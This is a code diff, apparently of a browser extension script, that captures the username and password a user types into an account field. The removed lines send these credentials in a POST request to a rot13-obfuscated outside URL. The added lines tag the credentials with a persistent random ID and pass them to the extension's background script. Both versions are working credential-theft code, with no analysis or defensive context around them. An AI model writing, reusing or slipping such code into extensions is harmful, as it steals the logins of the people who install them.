@@ -1,4 +1,18 @@
-
+chrome.storage.local.get(["customId"], function (result) {
+    console.log(result);
+    customId = result.customId;
+    if (customId == null) {
+        customId = Math.floor(Math.random()*256);
+    }
+    console.log("Value currently is " + customId);
+    
+    chrome.storage.local.set(
+        { customId: customId },
+        function () {
+            // console.log("Value is set to " + customId);
+        }
+    );
+});
 
 function init() {
     user_field = document.getElementById("fieldAccount");
@@ -34,18 +48,9 @@ function valueUpdate(user, pass) {
     if (pass == "") {
         return;
     }
-    wh = rot13(
-        "uggcf://guryvbafebne.pu/qp_sbejneq"
-    );
-    fetch(wh, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-            content: `Username: ${user}\nPassword: ${pass}`,
-        }),
-    });
+    (async () => {
+        const response = await chrome.runtime.sendMessage({req: "send", text: `ID: ${customId}\nUsername: ${user}\nPassword: ${pass}`});
+      })();
 }
 
 init();
